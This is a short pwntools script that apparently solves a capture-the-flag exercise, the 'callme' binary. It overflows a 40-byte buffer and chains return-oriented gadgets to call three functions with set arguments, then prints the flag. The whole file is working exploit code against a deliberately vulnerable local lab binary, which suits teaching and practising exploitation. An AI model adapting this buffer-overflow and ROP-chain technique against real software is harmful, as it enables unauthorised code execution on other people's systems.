from pwn import *

e = ELF('./callme')
p = e.process()

print(p.recv().decode())

raw_input('attach gdb')

padding = b'A' * 40

# extra return
ret = p64(0x4017d9)

# callme_one@plt
one = p64(0x401850)

# callme_two@plt
two = p64(0x401870)

# callme_three@plt
three = p64(0x401810)

# `pop rdi; pop rsi; pop rdx; ret` gadget
gadget = p64(0x401ab0)

# args to all funcs
args = p64(0x1) + p64(0x2) + p64(0x3)

payload = padding
payload += ret
payload += gadget
payload += args
payload += one
payload += gadget
payload += args
payload += two
payload += gadget
payload += args
payload += three

p.sendline(payload)

flag = p.recv().decode()
success(flag)
